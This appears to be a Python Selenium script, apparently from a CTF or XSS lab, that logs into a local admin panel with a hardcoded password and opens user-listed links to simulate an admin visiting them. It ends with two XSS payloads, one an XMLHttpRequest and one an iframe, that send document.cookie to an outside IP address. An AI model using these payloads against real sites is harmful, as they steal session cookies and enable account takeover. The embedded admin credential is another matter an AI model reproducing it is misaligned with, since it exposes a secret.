from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time

optionchrome_options = webdriver.ChromeOptions()
optionchrome_options.add_argument("--disable-popup-blocking")
driver = webdriver.Chrome(options=optionchrome_options)

driver.get("http://localhost:9000/admin/login.php")
driver.find_element(by=By.XPATH, value='/html/body/div[1]/div/div[2]/form/input[1]').send_keys("admin")
driver.find_element(by=By.XPATH, value='/html/body/div[1]/div/div[2]/form/input[2]').send_keys("SkPfc4nPxUTvsQWxWAqC")
driver.find_element(by=By.XPATH, value='/html/body/div[1]/div/div[2]/form/input[3]').click()

driver.find_element(by=By.XPATH, value='/html/body/ul/li[2]/a').click()
all_li = driver.find_element(by=By.XPATH, value='/html/body/ul').find_elements(by=By.TAG_NAME, value='li')
arr_href = []
for li in all_li: # populate
	text = li.text
	arr_href.append(li.find_element(by=By.TAG_NAME, value='a').get_attribute("href"))

for v in arr_href:
	driver.execute_script('''window.open("'''+v+'''","_blank");''')

print("Waiting 10 seconds before quitting")
time.sleep(10)
driver.quit()

'''
XSS PAYLOAD
================================
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://207.180.241.66:12345", true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
    value: document.cookie
}));
</script>
'''

'''
<script type="text/javascript"> 
document.write("<iframe src='http:///207.180.241.66:12345?cookie="+btoa(document.cookie)+"'></iframe>");
</script>
'''